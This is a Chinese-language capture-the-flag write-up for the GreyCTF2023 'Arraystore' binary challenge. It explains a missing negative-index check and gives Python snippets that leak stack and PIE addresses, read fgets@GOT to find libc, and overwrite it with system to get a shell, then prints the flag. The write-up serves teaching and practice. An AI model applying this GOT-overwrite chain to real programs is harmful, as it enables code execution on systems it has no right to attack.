# GreyCTF2023 Arraystore

## 题目简述

程序在栈上定义 `long long array[100]`，读写时只拒绝 `index >= 100`，没有检查负数。二进制启用 PIE、NX 和栈 canary，但只有 Partial RELRO，因此负索引可形成栈相对任意读写，并最终改写 GOT。

## 解题过程

先用固定负索引定位运行时地址。`array[-7]` 泄露的栈指针比数组首地址高 800 字节，`array[-1]` 则泄露 `main+357`，其静态偏移为 `0x11f5`：

```python
array_base = read_value(-7) - 800
pie_base = read_value(-1) - 0x11f5
```

任意地址对应的数组索引为

$index=(target-array\_base)/8$。

由 PIE 基址得到 `fgets@GOT`（静态偏移 `0x4020`），先读出其 libc 地址并计算 libc 基址，再把该 GOT 项覆盖为 `system`：

```python
fgets_got = pie_base + 0x4020
fgets_idx = (fgets_got - array_base) // 8
fgets_addr = read_value(fgets_idx)
libc_base = fgets_addr - libc.sym.fgets
write_value(fgets_idx, libc_base + libc.sym.system)
```

后续程序再次调用 `fgets(buffer, ...)` 时，实际执行 `system(buffer)`。在相应输入缓冲区送入 `/bin/sh` 或 `cat flag.txt`，取得：

```text
grey{wh0_s41d_1i5_0n1y_100_3ntr1e5?_9384h948rhfp84e3w9rfh984}
```

## 方法总结

数组边界检查必须同时覆盖上下界；只检查最大值会让负索引访问调用帧之外的任意地址。PIE 与 ASLR 通过两次信息泄露被消解，而 Partial RELRO 又提供了可写函数指针。完整利用链是“栈地址泄露 → PIE 泄露 → GOT 读出 libc → GOT 覆盖”，每一步都来自同一个负索引原语。
